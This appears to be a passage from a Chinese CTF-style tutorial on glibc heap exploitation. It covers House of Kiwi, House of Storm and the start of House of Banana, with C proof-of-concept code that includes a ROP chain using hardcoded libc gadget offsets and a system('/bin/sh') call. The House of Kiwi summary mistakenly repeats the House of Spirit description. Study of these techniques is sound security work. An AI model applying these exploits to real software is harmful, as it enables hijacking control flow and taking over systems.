class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; </span><br><span class="line"></span><br><span class="line">    fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; </span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h1><h2 id="概要-9"><a href="#概要-9" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Spirit的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p><p><strong>利用条件:</strong></p><ol><li>能够触发<code>__malloc_assert</code>,通常是堆溢出导致</li><li>能够任意写,修改<code>_IO_file_sync</code>和<code>IO_helper_jumps + 0xA0 and 0xA8</code></li></ol><p><strong>利用效果:</strong>控制流</p><p><strong>有效版本:</strong>ALL</p><p><strong>注意:</strong>因为house of kiwi要求能够修改libio中的vtable,这在许多版本glibc中是被禁止的,所以house of kiwi中提到的这条利用链不一定能够实现,但是其为我们提供了一个显式调用IO的方法,即通过assert触发fflush(stderr),从而调用stderr的vtable的sync,可以利用修改vtable偏移去调用别的vtable指针</p><h2 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h2><h3 id="malloc-assert"><a href="#malloc-assert" class="headerlink" title="__malloc_assert"></a>__malloc_assert</h3><ul><li><p>GLIBC 2.32/malloc.c:288</p><p>glibc中ptmalloc部分,从以前到现在都存在一个assret断言的问题,此处存在一个fflush(stderr)的函数调用,其中会调用_IO_file_jumps中的sync指针</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">       <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">(<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">           __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           file, line,</span><br><span class="line">           function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           assertion);</span><br><span class="line"><span class="built_in">fflush</span> (stderr);</span><br><span class="line"><span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如何触发assert?在<code>_int_malloc</code>中存在一个 assert (chunk_main_arena (bck-&gt;bk))位置可以触发,此外当<code>top_chunk</code>的大小不够分配时,则会进入sysmalloc中</p></li><li><p>GLIBC 2.32/malloc.c:2394</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="built_in">assert</span> ((old_top == <span class="built_in">initial_top</span> (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         <span class="built_in">prev_inuse</span> (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>此处会对top_chunk的<code>size|flags</code>进行assert判断</p><ol><li>old_size &gt;= 0x20;</li><li>old_top.prev_inuse = 0;</li><li>old_top页对齐</li></ol><p>通过这里也可以触发assert</p></li></ul><p>在<code>fflush</code>函数中调用到了一个指针:位于<code>_IO_file_jumps</code>中的<code>_IO_file_sync</code>指针,且可以发现调用指针时RDX寄存器的值始终为<code>IO_helper_jumps</code>指针,这样就联系到了setcontext</p><p>如果存在一个任意写,通过修改 <code>_IO_file_jumps + 0x60</code>的<code>_IO_file_sync</code>指针为<code>setcontext+61</code><br>修改<code>IO_helper_jumps + 0xA0 and 0xA8</code>分别为可迁移的存放有ROP的位置和ret指令的gadget位置,则可以进行栈迁移</p><h2 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Ubuntu 20.04, GLIBC 2.32_Ubuntu2.2</span></span><br><span class="line"><span class="comment">//gcc demo.c -o main -z noexecstack -fstack-protector-all -pie -z now -masm=intel</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdi_ret libc_base + 0x000000000002858F</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdx_r12 libc_base + 0x0000000000114161</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rsi_ret libc_base + 0x000000000002AC3F</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rax_ret libc_base + 0x0000000000045580</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> syscall_ret libc_base + 0x00000000000611EA</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ret pop_rdi_ret+1</span></span><br><span class="line"><span class="type">size_t</span> libc_base;</span><br><span class="line"><span class="type">size_t</span> ROP[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">char</span> FLAG[<span class="number">0x100</span>] = <span class="string">&quot;./flag.txt\x00&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sandbox</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">sfi</span>[] =</span>&#123;</span><br><span class="line">        &#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000004</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x05</span>,<span class="number">0xC000003E</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x35</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x40000000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0xFFFFFFFF</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x0000003B</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x7FFF0000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">sfp</span> =</span> &#123;<span class="number">8</span>, sfi&#125;;</span><br><span class="line">    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;sfp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setROP</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rax_ret;</span><br><span class="line">    ROP[i++] = <span class="number">2</span>;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)FLAG;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = syscall_ret;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">3</span>;</span><br><span class="line">    ROP[i++] = pop_rdx_r12;</span><br><span class="line">    ROP[i++] = <span class="number">0x100</span>;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)(FLAG + <span class="number">0x10</span>);</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)read;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">1</span>;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)write;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    sandbox();</span><br><span class="line">    libc_base  = ((<span class="type">size_t</span>)setvbuf) - <span class="number">0x81630</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;LIBC:\t%#lx\n&quot;</span>,libc_base);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> magic_gadget = libc_base + <span class="number">0x53030</span> + <span class="number">61</span>; <span class="comment">// setcontext + 61</span></span><br><span class="line">    <span class="type">size_t</span> IO_helper = libc_base + <span class="number">0x1E48C0</span>; <span class="comment">// _IO_helper_jumps;</span></span><br><span class="line">    <span class="type">size_t</span> SYNC = libc_base + <span class="number">0x1E5520</span>; <span class="comment">// sync pointer in _IO_file_jumps</span></span><br><span class="line">    setROP();</span><br><span class="line">    *((<span class="type">size_t</span>*)IO_helper + <span class="number">0xA0</span>/<span class="number">8</span>) = ROP; <span class="comment">// 设置rsp</span></span><br><span class="line">    *((<span class="type">size_t</span>*)IO_helper + <span class="number">0xA8</span>/<span class="number">8</span>) = ret; <span class="comment">// 设置rcx 即 程序setcontext运行完后会首先调用的指令地址</span></span><br><span class="line">    *((<span class="type">size_t</span>*)SYNC) = magic_gadget; <span class="comment">// 设置fflush(stderr)中调用的指令地址</span></span><br><span class="line">    <span class="comment">// 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert</span></span><br><span class="line">    <span class="type">size_t</span> *top_size = (<span class="type">size_t</span>*)((<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x10</span>) + <span class="number">0x18</span>);</span><br><span class="line">    *top_size = (*top_size)&amp;<span class="number">0xFFE</span>; <span class="comment">// top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中,其中有个判断top_chunk的size中inuse位是否存在</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// 触发assert</span></span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="house-of-storm"><a href="#house-of-storm" class="headerlink" title="house of storm"></a>house of storm</h1><h2 id="概要-10"><a href="#概要-10" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong><code>House_of_storm</code>是一种结合了<code>unsorted_bin_attack</code>和<code>Largebin_attack</code>的攻击技术,其基本原理和<code>Largebin_attack</code>类似，但是不同的是<code>Largebin_attack</code>只可以在任意地址写出chunk地址实际应用中除了泄漏一个堆地址并没有什么其他用处，所以其基本无害。而<code>House_of_storm</code>则可以导致任意地址分配chunk，也就是可以造成任意地址写的后果，危害十分之大。<code>House_of_storm</code>虽然危害之大，但是其条件也是非常的苛刻。</p><p><strong>利用条件:</strong></p><ol><li>需要攻击者在<code>largebin</code>和<code>unsorted_bin</code>中分别布置一个chunk 这两个chunk需要在归位之后处于同一个<code>largebin</code>的index中,且<code>unsortedbin</code>中的chunk要比<code>largebin</code>中的大</li><li>需要<code>unsorted_bin</code>中的<code>bk指针</code>可控</li><li>需要<code>largebin</code>中的<code>bk指针和bk_nextsize</code>指针可控</li><li>更适用于有pie情况</li></ol><p><strong>利用效果:</strong>任意地址分配chunk</p><p><strong>有效版本:</strong>2.29</p><p><strong>失效原因:</strong>2.29unsorted_attck不再可行,2.30large_attack又被砍掉一半,且正好是该方式需要用的的部分</p><h2 id="原理-10"><a href="#原理-10" class="headerlink" title="原理"></a>原理</h2><hr><p> <code>House_of_storm</code>从根本上也是写堆地址，但是攻击者可以利用巧妙的构造<code>把这个堆地址伪造成size字段</code>。</p><p><strong>通过以前的知识可以知道<code>unsorted_bin_attack</code>的攻击是需要在对应地址伪造一个chunk结构出来的，而这个伪造出来的chunk结构最重要的就是这个<code>size字段</code>，因为只有首先有了<code>size字段</code>Glibc才会确认这是个chunk结构,才会有后续的验证。</strong></p><p>说简单就是要绕过unsorted遍历时的size检查</p><p>但是目前的情况因为我们不能去对应的地址伪造chunk，那么首要目标就是利用<code>Largebin_attack</code>在目标地址-8的位置上写出来一个<code>size</code>，其次就是对Glibc检验的绕过。</p><h2 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -ggdb -fpie -pie -o house_of_storm house_of_storm.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  presize;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  fd;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  bk;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  fd_nextsize;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  bk_nextsize;</span><br><span class="line">&#125;chunk;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *large_chunk,*unsorted_chunk;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *fake_chunk = (<span class="type">unsigned</span> <span class="type">long</span> *)&amp;chunk;</span><br><span class="line">    <span class="type">char</span> *ptr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    unsorted_chunk=<span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0X20</span>);</span><br><span class="line">    large_chunk=<span class="built_in">malloc</span>(<span class="number">0x408</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(large_chunk);</span><br><span class="line">    <span class="built_in">free</span>(unsorted_chunk);</span><br><span class="line">    unsorted_chunk=<span class="built_in">malloc</span>(<span class="number">0x418</span>);  <span class="comment">//large_chunk归位</span></span><br><span class="line">    <span class="built_in">free</span>(unsorted_chunk);  <span class="comment">// unsorted_chunk归位</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//重点以下3步</span></span><br><span class="line">    unsorted_chunk[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span> )fake_chunk;</span><br><span class="line">    large_chunk[<span class="number">1</span>]    = (<span class="type">unsigned</span> <span class="type">long</span> )fake_chunk+<span class="number">8</span>;</span><br><span class="line">    large_chunk[<span class="number">3</span>]    = (<span class="type">unsigned</span> <span class="type">long</span> )fake_chunk<span class="number">-0x18</span><span class="number">-5</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">strncpy</span>(ptr, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">0x10</span>);</span><br><span class="line">    system(((<span class="type">char</span> *)fake_chunk + <span class="number">0x10</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在开启pie的情况下,堆块的高位一般都是0x55或0x56,共6字节,从size-5开始写就可以刚好把高位写在size</p><p>所以当我们申请的size和<code>0x56</code>经过对齐后相等的话，那么就可以拿到任意的chunk。</p><p>0x55 : <code>1010101</code></p><p>0x56 : <code>1010110</code></p><p><code>__int_malloc</code>在拿到chunk后返回到<code>__libc_malloc</code>，<code>__libc_malloc</code>会对chunk的进行检查，这里如果有错的话会直接crash，但是由于程序有随机化，多运行几次总能有一次成功的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#define arena_for_chunk(ptr) \</span></span><br><span class="line"><span class="comment">    (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    过以下检测需要满足的要求，只需满足一条即可</span></span><br><span class="line"><span class="comment">    1. victim 为 0</span></span><br><span class="line"><span class="comment">    2. IS_MMAPPED 为 1</span></span><br><span class="line"><span class="comment">    3. NON_MAIN_ARENA 为 0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">assert(!victim || chunk_is_mmapped(mem2chunk(victim)) </span><br><span class="line">       || ar_ptr == arena_for_chunk(mem2chunk(victim)));</span><br></pre></td></tr></table></figure><p>可以看出只有高位为0x56的情况下能通过检测</p><h1 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h1><h2 id="概要-11"><a href="#概要-11" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>利用largebin attack劫持_rtld_global中的字段,间接或直接控制fini_array,以便在函数正常退出或返回时调用布置的函数</p><p><strong>利用条件:</strong></p><ol><li><strong>程序能够显式的执行exit函数</strong>或者<strong>是通过libc_start_main启动的主函数且主函数能够结束</strong>,二者需满足其一</li><li>largebin attack (可写free状态下largebin的bk_nextsize字段)</li></ol><p><strong>适用情况:</strong>存在largebin attack,Tcache Stashing Unlink Attack等</p><p><strong>利用效果:</strong>控制流</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理-11"><a href="#原理-11" class="headerlink" title="原理"></a>原理</h2><p>在ld.so里存在一个_rtld_global结构体</p><p>gpt对这个结构的解释</p><blockquote><p>在Linux中，ELF（可执行与可链接格式）是一种用于执行程序和共享库的标准文件格式。而_rtld_global结构体是在Linux系统中用于管理动态链接器（runtime linker）的全局数据结构。</p><p>动态链接器（runtime linker）是负责在程序运行时加载和链接共享库的组件。它的主要任务是解析程序的依赖关系，加载所需的共享库，并解析符号引用，以便将其绑定到正确的地址上。</p><p>_rtld_global结构体是动态链接器的关键数据结构之一，它存储了动态链接器在运行时所需的全局信息。该结构体定义了动态链接器的状态和属性，包括已加载的共享库列表、符号表、重定位表、全局变量等等。</p><p>通过_rtld_global结构体，动态链接器可以跟踪和管理程序的符号依赖关系、共享库的加载和卸载、符号解析和重定位等操作。它提供了一个全局的上下文，使得动态链接器能够正确地处理程序的运行时链接需求。</p><p>总而言之，_rtld_global结构体在Linux中的作用是为动态链接器提供全局的状态和信息，以支持程序的动态加载和链接过程。</p></blockquote><p>该结构体较为复杂</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">rtld_global</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">/* Don&#x27;t change the order of the following elements.  &#x27;dl_loaded&#x27;</span></span><br><span class="line"><span class="comment">     must remain the first element.  Forever.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Non-shared code has no support for multiple namespaces.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_NNS 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_NNS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  EXTERN <span class="keyword">struct</span> <span class="title class_">link_namespaces</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* A pointer to the map for the main map.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">link_map</span> *_ns_loaded;</span><br><span class="line">    <span class="comment">/* Number of object in the _dl_loaded list.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_nloaded;</span><br><span class="line">    <span class="comment">/* Direct pointer to the searchlist of the main object.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">r_scope_elem</span> *_ns_main_searchlist;</span><br><span class="line">    <span class="comment">/* This is zero at program start to signal that the global scope map is</span></span><br><span class="line"><span class="comment">       allocated by rtld.  Later it keeps the size of the map.  It might be</span></span><br><span class="line"><span class="comment">       reset if in _dl_close if the last global object is removed.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_global_scope_alloc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* During dlopen, this is the number of objects that still need to</span></span><br><span class="line"><span class="comment">       be added to the global scope map.  It has to be taken into</span></span><br><span class="line"><span class="comment">       account when resizing the map, for future map additions after</span></span><br><span class="line"><span class="comment">       recursive dlopen calls from ELF constructors.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_global_scope_pending_adds;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Once libc.so has been loaded into the namespace, this points to</span></span><br><span class="line"><span class="comment">       its link map.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">link_map</span> *libc_map;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Search table for unique objects.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">unique_sym_table</span></span><br><span class="line">    &#123;</span><br><span class="line">      __rtld_lock_define_recursive (, lock)</span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">unique_sym</span></span><br><span class="line">      &#123;</span><br><span class="line">    <span class="type">uint32_t</span> hashval;</span><br><span class="line">    <span class="type">const</span> <span 